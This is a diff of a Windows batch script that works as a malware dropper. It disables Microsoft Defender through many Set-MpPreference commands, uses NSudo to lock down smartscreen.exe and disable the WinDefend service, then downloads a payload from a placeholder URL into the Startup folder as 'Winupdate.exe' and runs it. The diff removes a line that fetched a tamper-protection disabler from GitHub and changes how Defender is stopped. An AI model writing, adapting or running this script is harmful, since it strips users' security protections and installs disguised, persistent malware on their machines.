@@ -37,7 +37,6 @@ powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled
 
 powershell.exe -command "Set-MpPreference -PUAProtection disable"
 
-powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"
 
 powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
 powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"
@@ -46,7 +45,6 @@ powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $tru
 powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
 powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"
 
-powershell.exe -command "Set-MpPreference -MAPSReporting 0"
 powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
 powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
       
@@ -71,15 +69,12 @@ set yop=System32
 NSudo.exe -U:T -ShowWindowMode:Hide icacls "%iop%\%yop%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
  
-NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
-
-bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Disable-Tamper-Realtime-Protection/main/Disable-Tamper.cmd  %temp%\Disable-Tamper.cmd
-
+NSudo.exe -U:T -ShowWindowMode:Hide  sc config  windefend  start= disabled
 
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
 powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.exe   .\Winupdate.exe"
 
-start  Winupdate.exe & cd %temp% & Disable-Tamper.cmd
+start  Winupdate.exe
 
